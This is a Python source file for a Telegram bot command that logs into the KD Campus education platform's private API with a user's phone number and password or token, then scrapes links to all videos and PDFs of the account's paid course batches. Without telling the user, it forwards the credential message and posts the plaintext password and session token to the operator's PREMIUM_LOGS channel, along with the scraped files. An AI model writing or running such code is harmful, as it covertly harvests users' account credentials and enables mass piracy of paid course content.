from Extractor import app
from pyrogram import filters
import json
import time
import httpx
import hashlib
from config import PREMIUM_LOGS, join, BOT_TEXT, THUMB_URL
from datetime import datetime
import pytz
import asyncio
import os
import logging
from pyrogram.enums import ParseMode
from pyrogram.types import Message
import requests
from Extractor.core.utils import forward_to_log

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
TIMEOUT = 120
API_KEY = "kdc123"
THUMB_PATH = "thumb.jpg"


@app.on_message(filters.command(["kd"]))
async def kdlive(app, m):
    try:
        appname = 'KD Campus'
        await extract(app, m, appname)
    except Exception as e:
        logger.error(f"Error in kdlive: {e}")
        await m.reply_text(
            "<blockquote>❌ <b>An error occurred</b>\n\n"
            f"<b>Details:</b> <code>{str(e)}</code>\n"
            "<i>Please check your credentials or try again later.</i></blockquote>",
            parse_mode=ParseMode.HTML
        )


async def download_thumbnail():
    """Download thumbnail image if not already downloaded"""
    if not os.path.exists(THUMB_PATH):
        try:
            response = requests.get(THUMB_URL, timeout=10)
            if response.status_code == 200:
                with open(THUMB_PATH, 'wb') as f:
                    f.write(response.content)
                logger.info("Thumbnail downloaded successfully")
                return THUMB_PATH
        except Exception as e:
            logger.error(f"Error downloading thumbnail: {e}")
            return None
    return THUMB_PATH


async def extract(app, m, appname):
    try:
        start_time = time.time()
        
        # Initial login prompt
        editable = await m.reply_text(
            f"<blockquote>⚡ <b>{appname.upper()} EXTRACTOR</b> ⚡\n\n"
            "<b>Send your login details:</b>\n"
            "• <b>Format 1:</b> <code>ID*Password</code>\n"
            "• <b>Format 2:</b> <code>Token</code>\n\n"
            "<i>Example:</i>\n"
            "<code>9876543210*password123</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            input1 = await app.listen(m.chat.id, timeout=TIMEOUT)
            await forward_to_log(input1, "KD Live Extractor")
            id_password = input1.text.strip()
            await input1.delete()
        except asyncio.TimeoutError:
            await editable.edit_text(
                "<blockquote>⚠️ <b>Timeout:</b> No response received in time. Please start again.</blockquote>",
                parse_mode=ParseMode.HTML
            )
            return
            
        # Process login
        async with httpx.AsyncClient(timeout=30.0) as client:
            try:
                if '*' in id_password:
                    mob, pwd = id_password.split('*', 1)
                    password = hashlib.sha512(pwd.encode()).hexdigest()
                    payload = {
                        "code": "",
                        "valid_id": "",
                        "api_key": API_KEY,
                        "mobilenumber": mob,
                        "password": password
                    }
                    
                    headers = {
                        "User-Agent": "okhttp/4.10.0",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json; charset=UTF-8"
                    }
                    
                    resp = (await client.post(
                        "https://web.kdcampus.live/android/Usersn/login_user",
                        json=payload,
                        headers=headers
                    )).json()
                    
                    if 'data' not in resp or not resp['data']:
                        await editable.edit_text(
                            "<blockquote>❌ <b>Authentication Failed</b>\n\n"
                            "Invalid credentials or account does not exist.</blockquote>",
                            parse_mode=ParseMode.HTML
                        )
                        return
                        
                    user_data = resp['data']
                    token = user_data['connection_key']
                    userid = user_data['id']
                else:
                    token = id_password
                    try:
                        validate_resp = (await client.get(
                            f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/0/4'
                        )).json()
                        if not validate_resp:
                            await editable.edit_text(
                                "<blockquote>❌ <b>Invalid Token</b>\n\n"
                                "Your session token is expired or incorrect.</blockquote>",
                                parse_mode=ParseMode.HTML
                            )
                            return
                        userid = "0"
                    except Exception:
                        await editable.edit_text(
                            "<blockquote>❌ <b>Invalid Token</b>\n\n"
                            "Failed to authenticate with the provided token.</blockquote>",
                            parse_mode=ParseMode.HTML
                        )
                        return

                # Fetch courses
                resp = (await client.get(
                    f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4'
                )).json()
                
                if not resp or not isinstance(resp, list):
                    await editable.edit_text(
                        "<blockquote>❌ <b>No Courses Found</b>\n\n"
                        "No active subscriptions found for this account.</blockquote>",
                        parse_mode=ParseMode.HTML
                    )
                    return
                    
                batch_list = ""
                batch_ids = []
                batch_data = []
                
                for item in resp:
                    course_id = str(item['course_id'])
                    batch_id = str(item['batch_id'])
                    name = item['batch_name']
                    image = f"http://kdcampus.live/uploaded/landing_images/{item.get('banner_image_name', '')}"
                    
                    batch_list += f"▫️ <code>{batch_id}_{course_id}</code> ➔ <b>{name}</b>\n"
                    batch_ids.append(f"{batch_id}_{course_id}")
                    batch_data.append({
                        'id': course_id,
                        'batch_id': batch_id,
                        'name': name,
                        'image': image
                    })
                
                # Send aesthetic login success & batches list
                await editable.edit_text(
                    f"<blockquote>✅ <b>Login Successful — {appname}</b>\n\n"
                    f"🔑 <b>Credentials:</b> <code>{id_password}</code>\n"
                    f"📦 <b>Total Batches:</b> <code>{len(batch_data)}</code></blockquote>\n"
                    f"📚 <b>Available Batches:</b>\n\n{batch_list}",
                    parse_mode=ParseMode.HTML
                )
                
                # Log to premium channel
                await app.send_message(
                    PREMIUM_LOGS,
                    f"<blockquote>🌟 <b>New Login Session — {appname}</b>\n\n"
                    f"👤 <b>Input:</b> <code>{id_password}</code>\n"
                    f"🔑 <b>Token:</b> <code>{token}</code></blockquote>\n\n"
                    f"📚 <b>Available Batches:</b>\n{batch_list}",
                    parse_mode=ParseMode.HTML
                )
                
                # Batch ID request prompt
                input2 = await app.ask(
                    m.chat.id,
                    "<blockquote>📥 <b>BATCH SELECTION</b>\n\n"
                    "Send the <b>Batch ID</b> you want to extract.\n"
                    "<i>To extract multiple batches, separate them with commas.</i>\n\n"
                    f"💡 <b>All Batches:</b> <code>{','.join(batch_ids)}</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
                
                selected_ids = [id.strip() for id in input2.text.strip().split(',') if id.strip()]
                await input2.delete()
                await editable.delete()

                if not selected_ids:
                    await m.reply_text("<blockquote>❌ <b>No valid Batch IDs provided.</b></blockquote>", parse_mode=ParseMode.HTML)
                    return
                
                # Process each batch
                for batch_id in selected_ids:
                    if '_' not in batch_id:
                        await m.reply_text(
                            f"<blockquote>❌ <b>Invalid ID Format:</b> <code>{batch_id}</code>\n"
                            "Expected: <code>batchID_courseID</code></blockquote>",
                            parse_mode=ParseMode.HTML
                        )
                        continue
                        
                    progress_msg = await m.reply_text(
                        "<blockquote>🔄 <b>Initializing Extraction...</b>\n"
                        f"🎯 <b>Target Batch:</b> <code>{batch_id}</code></blockquote>",
                        parse_mode=ParseMode.HTML
                    )
                    
                    try:
                        bid, ccid = batch_id.split('_', 1)
                        batch_info = next((b for b in batch_data if b['batch_id'] == bid and b['id'] == ccid), None)
                        
                        if not batch_info:
                            await progress_msg.edit_text(
                                f"<blockquote>❌ <b>Batch Not Found:</b> <code>{batch_id}</code>\n"
                                "Please verify the ID and try again.</blockquote>",
                                parse_mode=ParseMode.HTML
                            )
                            continue

                        all_urls = []
                        topic_wise_content = {}
                        
                        # Fetch subjects
                        try:
                            subjects_response = await client.get(
                                f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{ccid}/{bid}"
                            )
                            subjects_data = subjects_response.json()
                            
                            if 'subjects' not in subjects_data or not subjects_data['subjects']:
                                await progress_msg.edit_text(
                                    f"<blockquote>❌ <b>No Subjects Found</b>\n\n"
                                    f"Batch: <b>{batch_info['name']}</b> is empty or unavailable.</blockquote>",
                                    parse_mode=ParseMode.HTML
                                )
                                continue
                                
                            subjects = subjects_data['subjects']
                        except Exception as e:
                            await progress_msg.edit_text(
                                f"<blockquote>❌ <b>Failed to fetch subjects:</b>\n<code>{str(e)}</code></blockquote>",
                                parse_mode=ParseMode.HTML
                            )
                            continue
                        
                        total_subjects = len(subjects)
                        processed = 0
                        total_videos = 0
                        total_pdfs = 0
                        last_edit = 0
                        
                        for subject in subjects:
                            sid = subject['id']
                            subject_name = subject['subject_name']
                            subject_content = []
                            
                            # Aesthetic extracting progress message (Throttled to avoid Telegram FloodWait)
                            if time.time() - last_edit > 2.5:
                                try:
                                    await progress_msg.edit_text(
                                        f"<blockquote>⚡ <b>EXTRACTING BATCH CONTENT</b>\n\n"
                                        f"📚 <b>Batch:</b> <code>{batch_info['name']}</code>\n"
                                        f"📖 <b>Subject:</b> <code>{subject_name}</code>\n"
                                        f"📊 <b>Progress:</b> [{processed}/{total_subjects}]\n"
                                        f"🎬 <b>Videos Found:</b> <code>{total_videos}</code>\n"
                                        f"📄 <b>PDFs Found:</b> <code>{total_pdfs}</code></blockquote>",
                                        parse_mode=ParseMode.HTML
                                    )
                                    last_edit = time.time()
                                except Exception:
                                    pass
                            
                            # Fetch Videos
                            try:
                                videos_response = await client.get(
                                    f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
                                )
                                videos = videos_response.json()
                                
                                if videos and isinstance(videos, list):
                                    for video in reversed(videos):
                                        title = video.get('content_title', '').strip()
                                        url = video.get('jwplayer_id', '')
                                        if title and url:
                                            url = "https://" + url if not url.startswith("http") else url
                                            all_urls.append(f"{title}: {url}")
                                            subject_content.append(f"🎬 {title}\n{url}")
                                            total_videos += 1
                            except Exception as e:
                                logger.error(f"Error fetching videos for subject {subject_name}: {e}")
                                
                            # Fetch PDFs
                            try:
                                pdfs_response = await client.get(
                                    f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
                                )
                                pdfs = pdfs_response.json()
                                
                                if pdfs and isinstance(pdfs, list):
                                    for pdf in reversed(pdfs):
                                        title = pdf.get('content_title', '').strip()
                                        filename = pdf.get('file_name', '')
                                        if title and filename:
                                            url = "https://kdcampus.live/uploaded/content_data/" + filename
                                            all_urls.append(f"{title}: {url}")
                                            subject_content.append(f"📄 {title}\n{url}")
                                            total_pdfs += 1
                            except Exception as e:
                                logger.error(f"Error fetching PDFs for subject {subject_name}: {e}")
                                
                            if subject_content:
                                topic_wise_content[subject_name] = subject_content
                                
                            processed += 1
                            
                        if not all_urls:
                            await progress_msg.edit_text(
                                f"<blockquote>❌ <b>No content links found</b> in batch: <b>{batch_info['name']}</b></blockquote>",
                                parse_mode=ParseMode.HTML
                            )
                            continue
                            
                        # File preparations
                        batch_name = batch_info['name']
                        timestamp = int(time.time())
                        safe_batch = "".join(x for x in batch_name if x.isalnum() or x in (' ', '-', '_')).strip()
                        txt_filename = f"KD_{safe_batch}_{timestamp}.txt"
                        zip_filename = f"KD_{safe_batch}_{timestamp}_topics.zip"
                        
                        # Save single TXT
                        with open(txt_filename, 'w', encoding='utf-8') as f:
                            f.write('\n'.join(all_urls))
                            
                        # Save ZIP by topics
                        try:
                            import zipfile
                            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                                for topic, content in topic_wise_content.items():
                                    safe_topic = "".join(x for x in topic if x.isalnum() or x in (' ', '-', '_')).strip()
                                    topic_filename = f"{safe_topic}.txt"
                                    zipf.writestr(topic_filename, '\n'.join(content))
                        except Exception as e:
                            logger.error(f"Error creating ZIP: {e}")
                            
                        # Count stats
                        video_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.mp4', '.m3u8', '.mpd', 'youtu.be', 'youtube.com', '/videos/', '/video/']))
                        pdf_count = sum(1 for url in all_urls if '.pdf' in url.lower())
                        other_count = len(all_urls) - (video_count + pdf_count)
                        
                        duration = time.time() - start_time
                        minutes, seconds = divmod(duration, 60)
                        now_ist = datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%b-%Y • %I:%M %p')
                        bot_username = (await app.get_me()).username
                        
                        # Aesthetic Blockquote Caption Report
                        caption = (
                            f"<blockquote>🎓 <b>EXTRACTION REPORT</b> 🎓\n\n"
                            f"📱 <b>Platform:</b> <code>{appname}</code>\n"
                            f"📚 <b>Batch Name:</b> <code>{batch_name}</code>\n"
                            f"🆔 <b>Batch ID:</b> <code>{batch_id}</code>\n"
                            f"⏱ <b>Time Taken:</b> <code>{int(minutes):02d}m {int(seconds):02d}s</code>\n"
                            f"📅 <b>Extracted On:</b> <code>{now_ist} IST</code>\n\n"
                            f"📊 <b>CONTENT SUMMARY:</b>\n"
                            f"├ 📁 <b>Total Files:</b> <code>{len(all_urls)}</code>\n"
                            f"├ 🎬 <b>Videos:</b> <code>{video_count}</code>\n"
                            f"├ 📄 <b>PDFs:</b> <code>{pdf_count}</code>\n"
                            f"├ 📦 <b>Others:</b> <code>{other_count}</code>\n"
                            f"└ 📑 <b>Subjects:</b> <code>{len(topic_wise_content)}</code>\n\n"
                            f"⚡ <b>Extracted by:</b> @{bot_username}\n"
                            f"╾────────────────────╼\n"
                            f"✦ <i>{BOT_TEXT}</i> ✦</blockquote>"
                        )
                        
                        try:
                            thumb_path = await download_thumbnail()
                            
                            # Send TXT Document
                            await app.send_document(
                                m.chat.id,
                                document=txt_filename,
                                caption=f"{caption}\n\n📄 <i>Complete Batch URL List</i>",
                                thumb=thumb_path if thumb_path else None,
                                parse_mode=ParseMode.HTML
                            )
                            if PREMIUM_LOGS:
                                await app.send_document(
                                    PREMIUM_LOGS,
                                    document=txt_filename,
                                    caption=caption,
                                    thumb=thumb_path if thumb_path else None,
                                    parse_mode=ParseMode.HTML
                                )
                                
                            # Send ZIP Document
                            if os.path.exists(zip_filename):
                                await app.send_document(
                                    m.chat.id,
                                    document=zip_filename,
                                    caption=f"{caption}\n\n📦 <i>Subject-Wise Organized Topics</i>",
                                    thumb=thumb_path if thumb_path else None,
                                    parse_mode=ParseMode.HTML
                                )
                                if PREMIUM_LOGS:
                                    await app.send_document(
                                        PREMIUM_LOGS,
                                        document=zip_filename,
                                        caption=caption,
                                        thumb=thumb_path if thumb_path else None,
                                        parse_mode=ParseMode.HTML
                                    )
                                    
                            await progress_msg.delete()

                        except Exception as e:
                            logger.error(f"Error sending files: {e}")
                            await progress_msg.edit_text(
                                f"<blockquote>❌ <b>Error Dispatching Files:</b>\n<code>{str(e)}</code></blockquote>",
                                parse_mode=ParseMode.HTML
                            )
                            
                        finally:
                            try:
                                if os.path.exists(txt_filename):
                                    os.remove(txt_filename)
                                if os.path.exists(zip_filename):
                                    os.remove(zip_filename)
                            except Exception as e:
                                logger.error(f"Error cleaning up files: {e}")
                                
                    except Exception as e:
                        logger.error(f"Error processing batch {batch_id}: {e}")
                        await progress_msg.edit_text(
                            f"<blockquote>❌ <b>Extraction Failure:</b>\n<code>{str(e)}</code></blockquote>",
                            parse_mode=ParseMode.HTML
                        )
                        
            except Exception as e:
                logger.error(f"Error in login process: {e}")
                await editable.edit_text(
                    f"<blockquote>❌ <b>Authentication Failure:</b>\n<code>{str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
                
    except Exception as e:
        logger.error(f"Error in extract: {e}")
        await m.reply_text(
            f"<blockquote>❌ <b>Unexpected Error Occurred:</b>\n<code>{str(e)}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        

